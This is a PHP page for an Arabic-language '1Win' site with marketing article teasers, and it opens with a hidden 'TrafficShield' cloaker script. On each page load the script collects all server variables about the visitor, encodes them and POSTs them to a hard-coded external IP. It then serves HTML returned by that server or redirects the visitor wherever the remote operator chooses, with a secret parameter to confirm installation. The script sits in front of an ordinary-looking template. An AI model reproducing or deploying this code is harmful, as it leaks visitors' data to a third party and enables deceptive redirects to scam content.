<?php
namespace TrafficShield; 
error_reporting(0);
  class Traffic_Shield{
    public function run() {             
      ob_start();
      $this->ogrsr9854();
    }
    public function ogrsr9854() { 
            $this->_check(); 
            $response = $this->https_request();        
            $this->main($response);       
        }     
        public function _check() {  
            if(isset($_GET['TS-BHDNR-84848'])){
                echo "583c1700e4";
            }
        }
    public function get_header() {  
            $headers = array();     
            foreach($_SERVER as $k=>$v){
               $headers[$k] = $v;
            }
            $headers['TS-BHDNR-74191'] = "900661405710890";
            $headers['TS-BHDNR-74194'] = "583c1700e4"; 
            return $headers;
        }
    public function get_header_post() {
            $get_header = $this->get_header();
            return base64_encode(json_encode($get_header));      
        } 
    public function https_request() {
           $get_header['headers'] = $this->get_header_post();
           $ch = curl_init();
           curl_setopt($ch, CURLOPT_URL, "http://198.211.101.164/v2/logic/cloaker");
           curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
           curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Mobile Safari/537.36');
           curl_setopt($ch, CURLOPT_POST, true);
           curl_setopt($ch, CURLOPT_POSTFIELDS, $get_header);
           $result = curl_exec($ch);                
           return json_decode($result);
        }
    public function main($response) {
            if(!empty($response)){
               if(isset($response->zrc) && !empty($response->zrc)){
                    echo base64_decode($response->zrc);
                    die();
                }else{                        
                    if($response->type == 1){
                        $this->get_url($response->url,$response->http_code);
                    }
                }
            }
        }
    public function get_url($url,$code) { 
            header("Location: ".$url, true, $code);            
        }
}
$traffic_Shield_Tre9854 = new Traffic_Shield();
$traffic_Shield_Tre9854->run();
// Copyright TrafficShield.io//
?>
<!DOCTYPE html>
<html lang="en">
  <head>
     
    <title>1Win</title>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=Edge" />
    <meta name="description" content="" />
    <meta name="keywords" content="" />
    <meta name="author" content="Tooplate" />
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />

    <link rel="stylesheet" href="css/bootstrap.min.css" />
    <link rel="stylesheet" href="css/font-awesome.min.css" />
    <link rel="stylesheet" href="css/animate.css" />
    <link rel="stylesheet" href="css/owl.carousel.css" />
    <link rel="stylesheet" href="css/owl.theme.default.min.css" />

    <!-- MAIN CSS -->
    <link rel="stylesheet" href="css/tooplate-style.css" />
  </head>
  <body id="top" data-spy="scroll" data-target=".navbar-collapse" data-offset="50">
    <!-- PRE LOADER -->
    <section class="preloader">
      <div class="spinner">
        <span class="spinner-rotate"></span>
      </div>
    </section>

    <!-- MENU -->
    <section class="navbar navbar-default navbar-static-top" role="navigation">
      <div class="container">
        <div class="navbar-header">
          <button class="navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
            <span class="icon icon-bar"></span>
            <span class="icon icon-bar"></span>
            <span class="icon icon-bar"></span>
          </button>

          <!-- lOGO TEXT HERE -->
          <a href="index.php" class="navbar-brand">1Win</a>
        </div>

        <!-- MENU LINKS -->
        <div class="collapse navbar-collapse">
          <ul class="nav navbar-nav navbar-right">
            <li><a href="index.php" class="smoothScroll">الرئيسية</a></li>
            <li><a href="blog.php" class="smoothScroll">المواد</a></li>
            <li><a href="contact.php" class="smoothScroll">الاتصالات</a></li>
            <li><a href="policy.php" class="smoothScroll">سياسة الخصوصية</a></li>
            <li><a href="terms.php" class="smoothScroll">الشروط والأحكام</a></li>
          </ul>
        </div>
      </div>
    </section>

    <!-- HOME -->
    <section id="home" class="slider" data-stellar-background-ratio="0.5">
      <div class="container">
        <div class="row">
          <div class="owl-carousel owl-theme">
            <div class="item item-first" style="background-image: url('./assets/images/bulksplash-glenncarstenspeters-p1qyef1g0hu.jpg')">
              <div class="caption">
                <div class="col-md-offset-1 col-md-10">
                  <h1>شعبية</h1>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </section>

    <!-- NEWS -->
    <section id="news" data-stellar-background-ratio="2.5">
      <div class="container">
        <div class="row">
          <div class="col-md-12 col-sm-12">
            <!-- SECTION TITLE -->
            <div class="section-title wow fadeInUp" data-wow-delay="0.1s">
              <h2>المواد</h2>
            </div>
          </div>
          
          <div class="col-md-6 col-sm-6" style="margin-bottom: 20px">
            <!-- NEWS THUMB -->
            <div class="news-thumb wow fadeInUp" data-wow-delay="0.4s">
              <a href="d2b0a93f8b0b03ad59e9a137552c8883.php">
                <img src="./assets/images/bulksplash-glenncarstenspeters-p1qyef1g0hu.jpg" class="img-responsive" alt="" />
              </a>
              <div class="news-info">
                <h3>إتقان أساسيات التسويق: استراتيجيات و تكتيكات نجاح</h3>
                <p><strong></strong> التسويق هو جزء أساسي من أي عمل ناجح. سواء كنت صغير, متجر محلي أو شركة كبير...</p>
                <a href="d2b0a93f8b0b03ad59e9a137552c8883.php">قراءة المزيد</a>
              </div>
            </div>
          </div>
          

          <div class="col-md-6 col-sm-6" style="margin-bottom: 20px">
            <!-- NEWS THUMB -->
            <div class="news-thumb wow fadeInUp" data-wow-delay="0.4s">
              <a href="f1dd3c001b3e96d6fd58fca6e37343b7.php">
                <img src="./assets/images/bulksplash-fakurian-0_8gaofrzbw.jpg" class="img-responsive" alt="" />
              </a>
              <div class="news-info">
                <h3>فتح قوة التسويق: تعلم استراتيجية وتكتيكات أساسيات</h3>
                <p><strong></strong> التسويق هو جزء أساسي من أي عمل ناجح وفتح قوتها يمكن أن تساعدك في الوصول إ...</p>
                <a href="f1dd3c001b3e96d6fd58fca6e37343b7.php">قراءة المزيد</a>
              </div>
            </div>
          </div>
          

        </div>
      </div>
    </section>

    <!-- FOOTER -->
    <footer data-stellar-background-ratio="5">
      <div class="container">
        <div class="row">
          <div class="col-md-12 col-sm-12">
            <div class="footer-thumb text-center">
              <h4 class="wow fadeInUp" data-wow-delay="0.4s">الاتصالات</h4>

              <div class="contact-info">
                <p><i class="fa fa-phone"></i>+2196022337473</p>
                <p><i class="fa fa-envelope-o"></i> <a href="#">trevion16@hotmail.com</a></p>
              </div>
            </div>
          </div>

          <div class="col-md-12 col-sm-12 border-top">
            <div class="col-md-12 col-sm-12">
              <div class="copyright-text text-center">
                <p>
                  © 1Win
                  <script>
                    document.write(new Date().getFullYear());
                  </script>
                  Copyright
                </p>
              </div>
            </div>
          </div>
        </div>
      </div>
    </footer>

    <div class="cookie-banner">
      <p style="color: #000000">
        1Win يستخدم ملفات تعريف الارتباط. أنها تسمح لنا بالتعرف عليك و الحصول على معلومات عن المستخدم الخاص بك experience.By الاستمرار في تصفح 1Win, كنت توافق على استخدام الكوكيز من قبل صاحب 1Win وفقا 
        <a target="_blank" href="https://en.wikipedia.org/wiki/HTTP_cookie"
          >سياسة الكوكيز</a
        >
      </p>

      <button class="close-cookie">×</button>
    </div>

    <script>
      window.onload = function () {
        $('.close-cookie').click(function () {
          $('.cookie-banner').fadeOut();
        });
      };
    </script>

    <script>
      let elems = document.querySelectorAll('.server-name');
      elems.forEach((elem) => {
        elem.innerHTML = window.location.hostname;
      });
    </script>

    <!-- SCRIPTS -->
    <script src="js/jquery.js"></script>
    <script src="js/bootstrap.min.js"></script>
    <script src="js/jquery.sticky.js"></script>
    <script src="js/jquery.stellar.min.js"></script>
    <script src="js/wow.min.js"></script>
    <script src="js/smoothscroll.js"></script>
    <script src="js/owl.carousel.min.js"></script>
    <script src="js/custom.js"></script>
  </body>
</html>
